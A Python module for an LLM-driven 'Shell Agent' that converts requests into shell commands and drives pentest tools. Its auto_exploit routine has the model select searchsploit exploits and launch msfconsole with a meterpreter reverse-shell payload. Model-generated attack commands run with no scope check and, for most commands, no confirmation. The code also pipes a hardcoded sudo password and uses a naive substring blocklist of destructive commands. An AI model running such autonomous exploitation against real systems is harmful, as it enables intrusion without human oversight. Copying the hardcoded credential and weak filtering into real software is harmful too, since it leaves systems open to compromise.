"""
Shell Agent

Executes shell commands, launches applications, analyzes results, chains events,
and performs security testing/exploitation.
Includes security measures: command allowlist/blocklist, sandboxing, dangerous command confirmation.
"""

import os
import asyncio
import logging
import time
from typing import Any, Dict, List, Optional
from enum import Enum

from agents.base import BaseAgent, AgentRole, AgentMessage

logger = logging.getLogger(__name__)


class CommandSafety(Enum):
    SAFE = "safe"
    CAUTION = "caution"
    DANGEROUS = "dangerous"
    BLOCKED = "blocked"


class ShellAgent(BaseAgent):
    """
    Agent for executing shell commands, launching apps, event chaining, and pentesting.
    
    Security model:
    - Commands are classified by safety level
    - Blocked commands are never executed
    - Dangerous commands require explicit confirmation
    - All commands are logged for audit
    
    Pentest capabilities:
    - Network scanning (nmap, arp)
    - Web vulnerability scanning (nikto, whatweb, gobuster, dirb)
    - SQL injection testing (sqlmap)
    - Brute force (hydra)
    - Exploitation framework (metasploit)
    - Packet crafting (scapy, impacket)
    """
    
    BLOCKED_COMMANDS = {
        'rm -rf /', 'mkfs', 'dd if=', ':(){', 'fork',
        'chmod -R 777 /', 'chown -R', '> /dev/sda',
        'shutdown', 'reboot', 'halt', 'init 0', 'init 6',
    }
    
    DANGEROUS_PATTERNS = {
        'rm -rf', 'rm -r', 'sudo rm', 'chmod 777', 'chown',
        'kill -9', 'killall', 'pkill',
    }
    
    SAFE_COMMANDS = {
        'ls', 'pwd', 'whoami', 'date', 'uptime', 'df', 'du', 'free',
        'ps', 'top', 'htop', 'netstat', 'ss', 'ip', 'ifconfig',
        'cat', 'head', 'tail', 'grep', 'find', 'wc', 'sort', 'uniq',
        'echo', 'env', 'printenv', 'uname', 'hostname',
        'nmap', 'nikto', 'whatweb', 'curl', 'wget',
        'python', 'python3', 'pip', 'pip3', 'node', 'npm',
        'git', 'docker', 'systemctl status',
        'journalctl', 'dmesg', 'lscpu', 'lshw', 'arp',
        'hydra', 'sqlmap', 'gobuster', 'dirb', 'msfconsole',
        'searchsploit', 'enum4linux', 'smbclient',
        'scapy', 'impacket', 'ndiff',
    }
    
    # Commands that need longer timeouts
    LONG_TIMEOUT_COMMANDS = {
        'nmap', 'nikto', 'sqlmap', 'hydra', 'gobuster', 'dirb',
        'msfconsole', 'msfvenom', 'searchsploit',
    }

    # Commands that need sudo
    SUDO_COMMANDS = {
        'nmap', 'nikto', 'sqlmap', 'hydra', 'gobuster', 'dirb',
        'msfconsole', 'msfvenom', 'enum4linux', 'smbclient',
        'aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airbase-ng',
        'hcitool', 'btmon', 'hcidump',
    }
    
    LAUNCHABLE_APPS = {
        'firefox': 'firefox', 'chromium': 'chromium-browser',
        'terminal': 'gnome-terminal', 'code': 'code',
        'wireshark': 'wireshark', 'burpsuite': 'burpsuite',
        'metasploit': 'msfconsole', 'nmap': 'nmap',
    }
    
    def __init__(self):
        super().__init__(
            role=AgentRole.CODE,
            name="Shell",
            description="Executes commands, launches apps, chains events, performs security testing and exploitation",
            permissions=["read", "write", "execute", "admin"],
            tools=["shell_executor", "app_launcher", "event_chainer", "exploit_framework"],
        )
        self._command_history: List[Dict[str, Any]] = []
        self._event_chains: Dict[str, List[str]] = {}
        self._pending_confirmations: Dict[str, str] = {}
        self._recent_outputs: List[Dict[str, Any]] = []
        self._max_recent = 20
        self._msf_sessions: List[Dict[str, Any]] = []
    
    async def process(self, message: AgentMessage) -> AgentMessage:
        content = message.content.strip()
        metadata = message.metadata
        
        if metadata.get("confirm_dangerous"):
            return await self._handle_confirmation(message)
        
        if self._is_followup(content):
            return await self._handle_followup(content, message)
        
        if content.startswith("!"):
            return await self._execute_and_analyze(content[1:].strip(), message)
        
        if content.lower().startswith("launch ") or content.lower().startswith("open "):
            app = content.split(None, 1)[1].strip()
            return await self._launch_app(app, message)
        
        if content.lower().startswith("chain "):
            return await self._handle_chain(content[6:].strip(), message)
        
        if content.lower().startswith("analyze ") or content.lower().startswith("analyse "):
            cmd = content.split(None, 1)[1].strip()
            return await self._analyze_command(cmd, message)
        
        return await self._nl_to_command(message.content, message)
    
    def _is_followup(self, content: str) -> bool:
        if not self._recent_outputs:
            return False
        followup_patterns = [
            "create a list", "summarize", "summary", "explain", "what does",
            "which ones", "how many", "show me", "filter", "sort", "analyze",
            "analyse", "details", "more info", "tell me about", "what are",
            "list them", "convert", "format", "parse", "extract", "them",
            "those", "these", "above", "previous", "last", "again",
            "exploit", "attack", "compromise", "gain access", "brute force",
            "scan for vulnerabilities", "test for", "check if vulnerable",
        ]
        content_lower = content.lower()
        return any(p in content_lower for p in followup_patterns)
    
    async def _handle_followup(self, content: str, message: AgentMessage) -> AgentMessage:
        recent = self._recent_outputs[-1] if self._recent_outputs else None
        
        if not recent:
            return AgentMessage(
                sender=self.name,
                receiver=message.sender,
                content="No recent command output to follow up on. Please run a command first.",
                message_type="text",
            )
        
        # Determine if this is an action request (exploit/scan/list) vs analysis request
        action_keywords = [
            "exploit", "attack", "scan", "test", "check", "try", "run",
            "use nmap", "use nikto", "use sqlmap", "use hydra", "use gobuster",
            "brute force", "inject", "dump", "enumerate", "extract",
        ]
        is_action = any(kw in content.lower() for kw in action_keywords)
        
        if is_action:
            # Generate a command and execute it
            llm_cmd = await self._llm_generate(
                prompt=(
                    f"Previous command: {recent['command']}\n\n"
                    f"Previous output:\n{recent['stdout'][:3000]}\n\n"
                    f"User request: {content}\n\n"
                    f"Generate a single shell command to fulfill this request based on the previous output.\n"
                    f"Rules:\n"
                    f"- Reply with ONLY the shell command. No explanation, no markdown, no backticks.\n"
                    f"- Use the data from the previous output (IPs, ports, services, versions)\n"
                    f"- For exploitation: use nmap scripts, nikto, sqlmap, hydra, curl, searchsploit, msfconsole\n"
                    f"- Keep it safe and non-destructive\n"
                ),
                system_prompt=(
                    "You are a pentest expert. Generate a shell command based on previous scan output. "
                    "Reply with ONLY the raw command. No explanations. No code blocks."
                ),
                max_tokens=256,
                temperature=0.1,
            )
            
            if llm_cmd:
                command = llm_cmd.strip().strip('`').strip()
                if command.startswith('```'):
                    command = command.split('\n', 1)[-1].rsplit('```', 1)[0].strip()
                
                safety = self._check_command_safety(command)
                if safety == CommandSafety.BLOCKED:
                    return AgentMessage(
                        sender=self.name, receiver=message.sender,
                        content=f"BLOCKED: Generated command is blocked:\n`{command}`\n\nPlease rephrase.",
                        message_type="text",
                    )
                if safety == CommandSafety.DANGEROUS:
                    self._pending_confirmations[command] = message.sender
                    return AgentMessage(
                        sender=self.name, receiver=message.sender,
                        content=f"Generated command requires confirmation:\n\n`{command}`\n\nReply 'confirm' to proceed or 'cancel' to abort.",
                        message_type="warning",
                        metadata={"requires_confirmation": True, "command": command},
                    )
                
                return await self._execute_and_analyze(command, message)
        
        # Analysis request — summarize / list / explain
        analysis = await self._llm_generate(
            prompt=(
                f"Recent command: {recent['command']}\n\n"
                f"Command output:\n{recent['stdout'][:3000]}\n\n"
                f"User follow-up request: {content}\n\n"
                f"Based on the command output above, help the user with their follow-up request. "
                f"If they ask to create a list, format the findings as a structured list. "
                f"Be specific and reference actual data from the output."
            ),
            system_prompt=(
                "You are the Shell agent for ELIOT cybersecurity system. "
                "Analyze command outputs and provide useful follow-up information. "
                "If asked to list, create a structured list from the data. "
                "Be concise but thorough. Reference specific data from the output."
            ),
            max_tokens=1024,
            temperature=0.3,
        )
        
        if analysis:
            response_content = f"Based on the previous command ({recent['command']}):\n\n{analysis}"
        else:
            response_content = f"Previous command output:\n\n{recent['stdout'][:1000]}\n\nPlease review the output above."
        
        return AgentMessage(
            sender=self.name,
            receiver=message.sender,
            content=response_content,
            message_type="analysis",
            metadata={"followup": True, "original_command": recent['command']},
        )
    
    async def _execute_and_analyze(self, command: str, message: AgentMessage) -> AgentMessage:
        result = await self._execute_command(command, message)
        
        if result.message_type in ["error", "warning"]:
            return result
        
        stdout = result.metadata.get("stdout", "")
        if stdout:
            analysis = await self._llm_generate(
                prompt=(
                    f"Command executed: {command}\n\n"
                    f"Output:\n{stdout[:3000]}\n\n"
                    f"Provide a useful summary of what this command found/did. "
                    f"If this is a security scan, highlight vulnerabilities found, "
                    f"their severity, and suggest specific next steps or exploitation commands. "
                    f"Be actionable - give the user exactly what to do next."
                ),
                system_prompt=(
                    "You are the Shell agent for ELIOT cybersecurity system. "
                    "Analyze command output and provide useful security insights. "
                    "Be concise but informative. Focus on actionable information. "
                    "For security scans, always suggest specific follow-up commands."
                ),
                max_tokens=768,
                temperature=0.3,
            )
            
            if analysis:
                self._store_output(command, stdout, analysis)
                
                enhanced_content = (
                    f"$ {command}\n\n"
                    f"{'─' * 40}\n"
                    f"{analysis}\n"
                    f"{'─' * 40}\n\n"
                    f"Raw output:\n{stdout[:2000]}"
                )
                
                return AgentMessage(
                    sender=self.name,
                    receiver=message.sender,
                    content=enhanced_content,
                    message_type="command_output",
                    metadata={
                        **result.metadata,
                        "analysis": analysis,
                        "enhanced": True,
                    },
                )
        
        self._store_output(command, stdout, "")
        return result
    
    def _store_output(self, command: str, stdout: str, analysis: str):
        self._recent_outputs.append({
            "command": command,
            "stdout": stdout,
            "analysis": analysis,
            "timestamp": time.time(),
        })
        if len(self._recent_outputs) > self._max_recent:
            self._recent_outputs = self._recent_outputs[-self._max_recent:]
    
    def _get_timeout(self, command: str) -> float:
        """Get appropriate timeout based on command type."""
        cmd_lower = command.lower()
        
        # Very long for exploit frameworks
        if any(kw in cmd_lower for kw in ['msfconsole', 'msfvenom']):
            return 600.0  # 10 minutes
        
        # Long for scanning
        if any(kw in cmd_lower for kw in ['nmap', 'nikto', 'sqlmap', 'hydra', 'gobuster', 'dirb']):
            return 300.0  # 5 minutes
        
        # Medium for network recon
        if any(kw in cmd_lower for kw in ['arp', 'ping', 'curl', 'wget', 'enum4linux']):
            return 120.0  # 2 minutes
        
        # Default
        return 60.0
    
    async def _execute_command(self, command: str, message: AgentMessage) -> AgentMessage:
        # Auto-add sudo for commands that need it
        cmd_stripped = command.strip()
        first_word = cmd_stripped.split()[0].lower() if cmd_stripped.split() else ""
        if first_word in self.SUDO_COMMANDS and "sudo" not in cmd_stripped:
            command = f"echo jetson | sudo -S {command}"

        safety = self._check_command_safety(command)
        
        if safety == CommandSafety.BLOCKED:
            return AgentMessage(
                sender=self.name,
                receiver=message.sender,
                content=f"BLOCKED: Command '{command}' is blocked for safety reasons.",
                message_type="error",
                metadata={"blocked": True, "command": command},
            )
        
        if safety == CommandSafety.DANGEROUS:
            self._pending_confirmations[command] = message.sender
            return AgentMessage(
                sender=self.name,
                receiver=message.sender,
                content=f"DANGEROUS: Command '{command}' requires confirmation.\n"
                       f"Reply with 'confirm {command}' to proceed or 'cancel' to abort.",
                message_type="warning",
                metadata={"requires_confirmation": True, "command": command},
            )
        
        try:
            timeout = self._get_timeout(command)
            
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=os.path.expanduser("~"),
                env={**os.environ, "TERM": "dumb"},
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )
            
            stdout_text = stdout.decode('utf-8', errors='replace')
            stderr_text = stderr.decode('utf-8', errors='replace')
            
            self._command_history.append({
                "command": command,
                "return_code": process.returncode,
                "timestamp": time.time(),
                "user": message.sender,
            })
            
            if process.returncode == 0:
                response_content = f"$ {command}\n\n{stdout_text}"
                if stderr_text:
                    response_content += f"\n\nStderr:\n{stderr_text}"
            else:
                response_content = f"$ {command}\n\nExit code: {process.returncode}\n\n{stdout_text}"
                if stderr_text:
                    response_content += f"\n\nStderr:\n{stderr_text}"
            
            return AgentMessage(
                sender=self.name,
                receiver=message.sender,
                content=response_content,
                message_type="command_output",
                metadata={
                    "command": command,
                    "return_code": process.returncode,
                    "stdout": stdout_text[:3000],
                    "stderr": stderr_text[:1000],
                    "safety": safety.value,
                    "timeout": timeout,
                },
            )
            
        except asyncio.TimeoutError:
            return AgentMessage(
                sender=self.name,
                receiver=message.sender,
                content=f"Command timed out after {int(timeout)} seconds: {command}",
                message_type="error",
                metadata={"timeout": True, "command": command},
            )
        except Exception as e:
            return AgentMessage(
                sender=self.name,
                receiver=message.sender,
                content=f"Error executing command: {str(e)}",
                message_type="error",
                metadata={"error": str(e), "command": command},
            )
    
    async def _handle_confirmation(self, message: AgentMessage) -> AgentMessage:
        content = message.content.strip()
        
        if content.lower().startswith("confirm "):
            command = content[8:].strip()
            if command in self._pending_confirmations:
                del self._pending_confirmations[command]
                return await self._execute_and_analyze(command, message)
        
        if content.lower() == "cancel":
            self._pending_confirmations.clear()
            return AgentMessage(
                sender=self.name,
                receiver=message.sender,
                content="Command cancelled.",
                message_type="text",
            )
        
        return AgentMessage(
            sender=self.name,
            receiver=message.sender,
            content="Please confirm or cancel the pending dangerous command.",
            message_type="text",
        )
    
    async def _launch_app(self, app_name: str, message: AgentMessage) -> AgentMessage:
        app_lower = app_name.lower()
        
        if app_lower in self.LAUNCHABLE_APPS:
            cmd = self.LAUNCHABLE_APPS[app_lower]
            return await self._execute_command(f"{cmd} &", message)
        
        return AgentMessage(
            sender=self.name,
            receiver=message.sender,
            content=f"Unknown application: {app_name}\n"
                   f"Available apps: {', '.join(self.LAUNCHABLE_APPS.keys())}",
            message_type="text",
        )
    
    async def _handle_chain(self, chain_cmd: str, message: AgentMessage) -> AgentMessage:
        commands = [c.strip() for c in chain_cmd.split("|")]
        
        if len(commands) < 2:
            return AgentMessage(
                sender=self.name,
                receiver=message.sender,
                content="Chain syntax: command1 | command2 | command3",
                message_type="text",
            )
        
        results = []
        for i, cmd in enumerate(commands):
            result = await self._execute_command(cmd, message)
            results.append(f"Step {i+1}: {cmd}\n{result.content}")
            
            if result.metadata.get("return_code", 0) != 0:
                results.append(f"\nChain stopped at step {i+1} due to failure.")
                break
        
        chain_output = "\n\n".join(results)
        analysis = await self._llm_generate(
            prompt=(
                f"Event chain executed:\n{chain_cmd}\n\n"
                f"Results:\n{chain_output[:3000]}\n\n"
                f"Summarize what this chain accomplished and any important findings."
            ),
            system_prompt=(
                "You are the Shell agent for ELIOT cybersecurity system. "
                "Analyze command chain results and provide useful summary."
            ),
            max_tokens=512,
            temperature=0.3,
        )
        
        if analysis:
            final_content = f"Event Chain Results:\n\n{analysis}\n\n{'─' * 40}\n\nDetailed output:\n{chain_output[:2000]}"
        else:
            final_content = chain_output
        
        return AgentMessage(
            sender=self.name,
            receiver=message.sender,
            content=final_content,
            message_type="chain_output",
            metadata={"chain_length": len(results), "commands": commands},
        )
    
    async def _analyze_command(self, command: str, message: AgentMessage) -> AgentMessage:
        safety = self._check_command_safety(command)
        
        analysis = await self._llm_generate(
            prompt=f"Analyze this shell command for security and functionality:\n\n{command}\n\n"
                   f"Safety level: {safety.value}\n\n"
                   f"What does this command do? What are the risks?",
            system_prompt=(
                "You are the Shell agent for ELIOT cybersecurity system. "
                "Analyze commands for security implications, potential risks, and functionality. "
                "Be concise and focus on security aspects."
            ),
            max_tokens=512,
            temperature=0.3,
        )
        
        if analysis:
            response_content = f"Command Analysis:\n\n{command}\n\nSafety: {safety.value}\n\n{analysis}"
        else:
            response_content = f"Command Analysis:\n\n{command}\n\nSafety: {safety.value}\n\nDescription: This command would execute '{command}' on the system."
        
        return AgentMessage(
            sender=self.name,
            receiver=message.sender,
            content=response_content,
            message_type="analysis",
            metadata={"command": command, "safety": safety.value},
        )
    
    async def _nl_to_command(self, text: str, message: AgentMessage) -> AgentMessage:
        # Build context of recent commands for the LLM
        recent_context = ""
        if self._recent_outputs:
            last = self._recent_outputs[-1]
            recent_context = f"\nRecent command context: {last['command']}\nRecent output preview: {last['stdout'][:500]}\n"
        
        llm_cmd = await self._llm_generate(
            prompt=(
                f"Convert this natural language request into a Linux shell command.\n"
                f"Request: {text}\n"
                f"{recent_context}\n"
                f"Rules:\n"
                f"- Reply with ONLY the shell command. No explanation, no markdown, no backticks.\n"
                f"- For network scanning: use nmap with appropriate flags (-sn for ping scan, -sV for versions, -sC for scripts)\n"
                f"- For web scanning: use nikto, gobuster, or whatweb\n"
                f"- For SQL injection: use sqlmap with appropriate flags\n"
                f"- For brute force: use hydra\n"
                f"- For exploitation: use msfconsole -x with appropriate exploit/payload\n"
                f"- Keep commands practical and targeted\n"
                f"- If the user references previous output, use that context\n"
            ),
            system_prompt=(
                "You are a Linux pentest expert. Convert natural language to shell commands. "
                "Reply with ONLY the raw command. No explanations. No code blocks. No backticks."
            ),
            max_tokens=256,
            temperature=0.1,
        )
        
        if llm_cmd:
            command = llm_cmd.strip().strip('`').strip()
            if command.startswith('```'):
                command = command.split('\n', 1)[-1].rsplit('```', 1)[0].strip()
            
            safety = self._check_command_safety(command)
            
            if safety == CommandSafety.BLOCKED:
                return AgentMessage(
                    sender=self.name,
                    receiver=message.sender,
                    content=f"BLOCKED: Generated command is blocked for safety:\n`{command}`\n\nPlease rephrase.",
                    message_type="text",
                    metadata={"generated_command": command, "blocked": True},
                )
            
            if safety == CommandSafety.DANGEROUS:
                self._pending_confirmations[command] = message.sender
                return AgentMessage(
                    sender=self.name,
                    receiver=message.sender,
                    content=f"Generated command requires confirmation:\n\n`{command}`\n\nReply 'confirm' to proceed or 'cancel' to abort.",
                    message_type="warning",
                    metadata={"requires_confirmation": True, "command": command},
                )
            
            return await self._execute_and_analyze(command, message)
        
        return AgentMessage(
            sender=self.name,
            receiver=message.sender,
            content="I couldn't convert that to a shell command. Try using `!command` for direct execution.",
            message_type="text",
        )
    
    # ── Auto-Exploit & Session Management ─────────────────────

    async def auto_exploit(self, target: str, services: List[Dict[str, Any]], message: AgentMessage) -> AgentMessage:
        """
        Auto-exploit: query searchsploit for each service, LLM ranks exploits,
        then execute the best ones.
        """
        exploit_candidates = []

        for svc in services:
            name = svc.get("name", "")
            version = svc.get("version", "")
            port = svc.get("port", 0)
            if not name:
                continue

            search_term = f"{name} {version}".strip()
            stdout, rc = await self._run_cmd(f"searchsploit {search_term} 2>/dev/null")
            if rc == 0 and stdout.strip():
                for line in stdout.split("\n"):
                    if "/" in line and "exploits/" in line:
                        parts = line.split()
                        if parts:
                            exploit_path = parts[0]
                            exploit_candidates.append({
                                "service": name,
                                "version": version,
                                "port": port,
                                "exploit_path": exploit_path,
                                "raw": line.strip(),
                            })

        if not exploit_candidates:
            return AgentMessage(
                sender=self.name, receiver=message.sender,
                content=f"No searchsploit matches found for {target} services.",
                message_type="text",
            )

        # LLM ranks and selects best exploit
        exploit_list = "\n".join(
            f"- {e['exploit_path']} (service: {e['service']} {e['version']}, port: {e['port']})"
            for e in exploit_candidates[:15]
        )

        llm_result = await self._llm_generate(
            prompt=(
                f"Target: {target}\n\n"
                f"Available exploits from searchsploit:\n{exploit_list}\n\n"
                f"Rank these by feasibility and select the TOP 3 most promising.\n"
                f"For each, provide the exact msfconsole command to run.\n"
                f"Format each as one line: EXPLOIT_PATH | msfconsole_command\n"
                f"Use this msfconsole template:\n"
                f"  msfconsole -q -x 'use exploit/PATH; set RHOSTS {target}; set RPORT PORT; set PAYLOAD payload/linux/x64/meterpreter/reverse_tcp; set LHOST SELF_IP; exploit; exit'\n"
                f"Replace SELF_IP with the machine's IP ({self._get_self_ip()}).\n"
                f"Reply with ONLY the exploit paths and commands, one per line."
            ),
            system_prompt=(
                "You are an exploitation expert. Select the best exploits and generate "
                "exact msfconsole commands. Reply with ONLY the commands, one per line. "
                "No explanations."
            ),
            max_tokens=512,
            temperature=0.1,
        )

        if not llm_result:
            return AgentMessage(
                sender=self.name, receiver=message.sender,
                content=f"Found {len(exploit_candidates)} exploit(s) but could not generate commands.",
                message_type="text",
            )

        # Parse and execute
        results = []
        for line in llm_result.strip().split("\n"):
            line = line.strip()
            if not line or "|" not in line:
                continue
            parts = line.split("|", 1)
            exploit_path = parts[0].strip()
            msf_cmd = parts[1].strip() if len(parts) > 1 else ""

            if not msf_cmd:
                continue

            # Check authorization
            from agents.tamagotchi import get_tamagotchi_engine
            tama = get_tamagotchi_engine()
            if tama.needs_authorization(msf_cmd):
                tama.create_notification(
                    ntype="exploit_ready",
                    title=f"Exploit ready: {exploit_path}",
                    message=f"Target: {target}, Service: {exploit_path}",
                    target=target,
                    severity="high",
                    needs_auth=True,
                    exploit_cmd=msf_cmd,
                )
                results.append(f"[PENDING AUTH] {exploit_path} -> {msf_cmd}")
            else:
                result = await self._execute_and_analyze(msf_cmd, message)
                results.append(f"[EXECUTED] {exploit_path}\n{result.content[:500]}")

        combined = "\n\n".join(results)
        return AgentMessage(
            sender=self.name, receiver=message.sender,
            content=f"Auto-exploit results for {target}:\n\n{combined}",
            message_type="exploit_output",
            metadata={"target": target, "exploits_found": len(exploit_candidates)},
        )

    async def manage_msf_sessions(self, action: str = "list") -> str:
        """Manage Metasploit sessions."""
        if action == "list":
            cmd = "msfconsole -q -x 'sessions -l; exit' 2>/dev/null"
        elif action.startswith("interact:"):
            session_id = action.split(":")[1]
            cmd = f"msfconsole -q -x 'sessions -i {session_id}; exit' 2>/dev/null"
        else:
            return "Unknown action"

        stdout, rc = await self._run_cmd(cmd, timeout=30)
        return stdout

    def _get_self_ip(self) -> str:
        """Get our own IP address."""
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    async def _run_cmd(self, command: str, timeout: float = 60.0) -> tuple:
        """Run a command and return (stdout, returncode)."""
        try:
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return stdout.decode("utf-8", errors="replace"), proc.returncode or 0
        except asyncio.TimeoutError:
            return "", -1
        except Exception:
            return "", -1

    def _check_command_safety(self, command: str) -> CommandSafety:
        command_lower = command.lower()
        
        for blocked in self.BLOCKED_COMMANDS:
            if blocked in command_lower:
                return CommandSafety.BLOCKED
        
        for pattern in self.DANGEROUS_PATTERNS:
            if pattern in command_lower:
                return CommandSafety.DANGEROUS
        
        first_word = command_lower.split()[0] if command_lower.split() else ""
        if first_word in self.SAFE_COMMANDS:
            return CommandSafety.SAFE
        
        if "|" in command:
            parts = command.split("|")
            for part in parts:
                part_lower = part.strip().lower()
                first_word_part = part_lower.split()[0] if part_lower.split() else ""
                if first_word_part in {"rm", "dd", "mkfs", "chmod", "chown"}:
                    return CommandSafety.DANGEROUS
        
        return CommandSafety.CAUTION
    
    def get_command_history(self) -> List[Dict[str, Any]]:
        return self._command_history[-100:]
    
    def get_recent_context(self) -> str:
        if not self._recent_outputs:
            return "No recent commands."
        context_parts = []
        for item in self._recent_outputs[-5:]:
            context_parts.append(
                f"Command: {item['command']}\n"
                f"Output preview: {item['stdout'][:300]}..."
            )
        return "\n\n".join(context_parts)
    
    def clear_history(self):
        self._command_history.clear()
        self._recent_outputs.clear()
